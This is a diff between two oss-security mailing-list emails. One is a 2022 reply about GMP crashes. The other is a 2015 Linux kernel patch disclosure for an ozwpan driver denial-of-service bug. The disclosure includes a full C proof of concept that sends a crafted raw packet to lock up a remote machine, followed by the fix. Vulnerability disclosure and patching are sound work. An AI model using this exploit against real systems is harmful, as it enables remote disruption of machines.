@@ -1,4 +1,9 @@
-Received: (qmail 28454 invoked by uid 550); 7 Sep 2022 12:20:18 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4550" "Wednesday" "13" "May" "2015" "20:33:34" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431542014-3239-5-git-send-email-Jason@zx2c4.com>" "179" "[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS" nil nil nil "5" "2015051318:33:34" "[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS" (number mark "U       Jason@zx2c4. May 13  179/4550  " thread-indent "\"[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS\"\n") "<1431542014-3239-1-git-send-email-Jason@zx2c4.com>" ("<1431542014-3239-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 7231 invoked by uid 550); 13 May 2015 18:35:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,70 +12,204 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 18373 invoked from network); 7 Sep 2022 05:36:41 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :from:to:cc:subject:date;
-        bh=GqN+Bbfol47W2BNgfW2nDa91CN3dkVl3xidYhnjFBOo=;
-        b=npGu/QDNnu3Hdl12eY4hz0+V+zMs511aJM/4E1GUjRO6iR1WkSgppH5Zhueq+pnRVJ
-         ELUHlRHsU8Wm5S8FLClAMUOYE7vXhPcN4PAui8rAo/MJOWj0zJgjUWbLJFhuXF8wJ6yu
-         1fCyxFYzzaOAwjoYIXcp/WbzJp6DEP5qn96RltdOJ9lH+aS77IoOADx6g60Efv9HaF7e
-         QR6yZQFipBZBxXZDC4TJJDNBF70UZQPlolrqcLKsNHI87/fFGwn5di6jgEocyiPWzp+o
-         UbLlv8XHzHbdsN5lJcWSZXlmKIZdCt7CTTzX/eWWAbphfVcezjpPiJoriqLrQoVX4Tfp
-         oIIw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :x-gm-message-state:from:to:cc:subject:date;
-        bh=GqN+Bbfol47W2BNgfW2nDa91CN3dkVl3xidYhnjFBOo=;
-        b=gBuo5MAFtB6m0cFMLN7AjF4SQAdDHYSCpIb7N6Wdi5jYoOtYj5qw/ZECUlYFSFJBDu
-         6NUJPF76Hq6YvUP8oilh/TaaQZfXt/EdtfLQQnOLIuyg4YD/F912Cj0X10E5as5+Mi7P
-         k9ENw9X7bI9W1FqXz0JnpA3brzOyvpMRPP8YnFA94YTzZ8WgLicZvjXIql0F//2Ws8+I
-         vjIWhDINFzeqFK4kmsPfmLH8aqNVJUeoNRist7q11+OPHGFjn7/SVUScU7eaLbgWb6XR
-         W7k7NreXei4e4rao7EWlzIuo7a4YQIbKPLZmkQx5wC8kEW5NMLZZNBuXghcxsvWU/I/9
-         D78Q==
-X-Gm-Message-State: ACgBeo0bbucqckQH9Mhfh/gX4gjGjSFR8mAaO2nfbEJ9128txZ3Y0vjo
-	aVOhztiGYdoQTz0cKU9qucmsSGhAOjbTFDBJFTt/wqBzxMk=
-X-Google-Smtp-Source: AA6agR5hMDqKZ5rkd6ucZhtcWpZAt56IR4pO/8kpVq1wv6RzoI/rlHsa0BwkOY+Sanp/kWDOyH8pZZIlhQ3py1lCrKY=
-X-Received: by 2002:adf:f90d:0:b0:20c:de32:4d35 with SMTP id
- b13-20020adff90d000000b0020cde324d35mr872986wrr.583.1662528989652; Tue, 06
- Sep 2022 22:36:29 -0700 (PDT)
-MIME-Version: 1.0
-References: <CAGUWgD9QR7mjyVnBV4NcyVv=RzLBjNoqvv=d02P-GGsdOV_VWg@mail.gmail.com>
- <20220906115010.gs7kec3wkmayhmhf@yuggoth.org> <CAH8yC8k8C-gp9upSpJLsXrhBB5-qSnKGeP34+32A-_s5YG3UTA@mail.gmail.com>
- <20220907013017.GA1357227@millbarge>
-In-Reply-To: <20220907013017.GA1357227@millbarge>
-From: Georgi Guninski <gguninski@gmail.com>
-Date: Wed, 7 Sep 2022 08:36:17 +0300
-Message-ID: <CAGUWgD8f4V3uYf7wLjfHarRSwPo1PgqwDSWcNX6LaO_Cgco8vA@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
-Subject: Re: [oss-security] sagemath denial of service with abort() in gmp:
- overflow in mpz type
+Received: (qmail 3854 invoked from network); 13 May 2015 18:34:43 -0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
+	:subject:date:message-id:in-reply-to:references; s=mail; bh=n9hQ
+	AYzYkvWQDNJQwGLkzcQsItw=; b=j15a+/JJJ9FuuFa3YNmYtblL5m/7W/4m+oGb
+	eWR7Lz3DFfYqQba0gGM6MEs89s/2Gnivttxqqy/cQhlATChL4UnvH2qiZMguOFml
+	2Oo+pWcXm5o1TuuK6PWud51UCCzecerdxHWfvdENYSuUafEgxKtlIiynEu1l2tKW
+	oX8TKkyA8RVyN1xx8gp3TlkYWV8x2kDp+6A7sulAseQKrynKj6hMB9t22dl3ZMCy
+	DGbpSeWvqnDANNAftuIvwjSywD1AjiNh9XUpUkWJFkNW+yY8qeDh3XLhJla5ble0
+	8YhIYCs6qjiW5WKJ2YXiUVc8PoAtzg19dn9CdPaEUJOVq56/QQ==
+From: "Jason A. Donenfeld" <Jason@zx2c4.com>
+To: shigekatsu.tateno@atmel.com,
+	linux-kernel@vger.kernel.org,
+	netdev@vger.kernel.org,
+	oss-security@lists.openwall.com
+Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
+Date: Wed, 13 May 2015 20:33:34 +0200
+Message-Id: <1431542014-3239-5-git-send-email-Jason@zx2c4.com>
+X-Mailer: git-send-email 2.3.6
+In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
+References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
+Subject: [oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS
 
-On Wed, Sep 7, 2022 at 4:32 AM Seth Arnold <seth.arnold@canonical.com> wrote:
+The subtraction here was using a signed integer and did not have any
+bounds checking at all. This commit adds proper bounds checking, made
+easy by use of an unsigned integer. This way, a single packet won't be
+able to remotely trigger a massive loop, locking up the system for a
+considerable amount of time. A PoC follows below, which requires
+ozprotocol.h from this module.
 
->
-> Could an application that handles secrets and uses GMP use prctl(2)'s
-> PR_SET_DUMPABLE command to prevent dumping the core file? It'd also
-> prevent using ptrace-based debugging, so it's not without costs, but if
-> it handles secrets, that's probably also a good idea.
->
-on ubuntu 20 a lot of stuff depends on libgmp:
+=-=-=-=-=-=
 
-$ apt-cache rdepends libgmp10 | wc -l
-2442
-$ apt-cache rdepends libgmp10 | grep -i crypt | wc -l
-28
+ #include <arpa/inet.h>
+ #include <linux/if_packet.h>
+ #include <net/if.h>
+ #include <netinet/ether.h>
+ #include <stdio.h>
+ #include <string.h>
+ #include <stdlib.h>
+ #include <endian.h>
+ #include <sys/ioctl.h>
+ #include <sys/socket.h>
 
-some examples:
-  gcc-9
-  gawk
-  g++-9
-  dnsmasq-base
-  cpp-9-s390x-linux-gnu
+ #define u8 uint8_t
+ #define u16 uint16_t
+ #define u32 uint32_t
+ #define __packed __attribute__((__packed__))
+ #include "ozprotocol.h"
 
-will the infidels who argue that crash in python is nothing
-still will claim that gmp crash in any of the 2442 packages
-is still nothing?
+static int hex2num(char c)
+{
+	if (c >= '0' && c <= '9')
+		return c - '0';
+	if (c >= 'a' && c <= 'f')
+		return c - 'a' + 10;
+	if (c >= 'A' && c <= 'F')
+		return c - 'A' + 10;
+	return -1;
+}
+static int hwaddr_aton(const char *txt, uint8_t *addr)
+{
+	int i;
+	for (i = 0; i < 6; i++) {
+		int a, b;
+		a = hex2num(*txt++);
+		if (a < 0)
+			return -1;
+		b = hex2num(*txt++);
+		if (b < 0)
+			return -1;
+		*addr++ = (a << 4) | b;
+		if (i < 5 && *txt++ != ':')
+			return -1;
+	}
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	if (argc < 3) {
+		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
+		return 1;
+	}
+
+	uint8_t dest_mac[6];
+	if (hwaddr_aton(argv[2], dest_mac)) {
+		fprintf(stderr, "Invalid mac address.\n");
+		return 1;
+	}
+
+	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+	if (sockfd < 0) {
+		perror("socket");
+		return 1;
+	}
+
+	struct ifreq if_idx;
+	int interface_index;
+	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
+	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
+		perror("SIOCGIFINDEX");
+		return 1;
+	}
+	interface_index = if_idx.ifr_ifindex;
+	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
+		perror("SIOCGIFHWADDR");
+		return 1;
+	}
+	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_elt_connect_req oz_elt_connect_req;
+		struct oz_elt oz_elt2;
+		struct oz_multiple_fixed oz_multiple_fixed;
+	} __packed packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(0)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_CONNECT_REQ,
+			.length = sizeof(struct oz_elt_connect_req)
+		},
+		.oz_elt_connect_req = {
+			.mode = 0,
+			.resv1 = {0},
+			.pd_info = 0,
+			.session_id = 0,
+			.presleep = 0,
+			.ms_isoc_latency = 0,
+			.host_vendor = 0,
+			.keep_alive = 0,
+			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
+			.max_len_div16 = 0,
+			.ms_per_isoc = 0,
+			.up_audio_buf = 0,
+			.ms_per_elt = 0
+		},
+		.oz_elt2 = {
+			.type = OZ_ELT_APP_DATA,
+			.length = sizeof(struct oz_multiple_fixed) - 3
+		},
+		.oz_multiple_fixed = {
+			.app_id = OZ_APPID_USB,
+			.elt_seq_num = 0,
+			.type = OZ_USB_ENDPOINT_DATA,
+			.endpoint = 0,
+			.format = OZ_DATA_F_MULTIPLE_FIXED,
+			.unit_size = 1,
+			.data = {0}
+		}
+	};
+
+	struct sockaddr_ll socket_address = {
+		.sll_ifindex = interface_index,
+		.sll_halen = ETH_ALEN,
+		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+	};
+
+	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	return 0;
+}
+
+Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
+---
+ drivers/staging/ozwpan/ozusbsvc1.c | 4 +++-
+ 1 file changed, 3 insertions(+), 1 deletion(-)
+
+diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
+index 2e67956..934a571 100644
+--- a/drivers/staging/ozwpan/ozusbsvc1.c
++++ b/drivers/staging/ozwpan/ozusbsvc1.c
+@@ -326,11 +326,13 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,
+ 			struct oz_multiple_fixed *body =
+ 				(struct oz_multiple_fixed *)data_hdr;
+ 			u8 *data = body->data;
+-			int n;
++			unsigned int n;
+ 			if (!body->unit_size)
+ 				break;
+ 			n = (len - sizeof(struct oz_multiple_fixed)+1)
+ 				/ body->unit_size;
++			if (n > len / body->unit_size)
++				break;
+ 			while (n--) {
+ 				oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
+ 					data, body->unit_size);
+-- 
+2.3.6
+
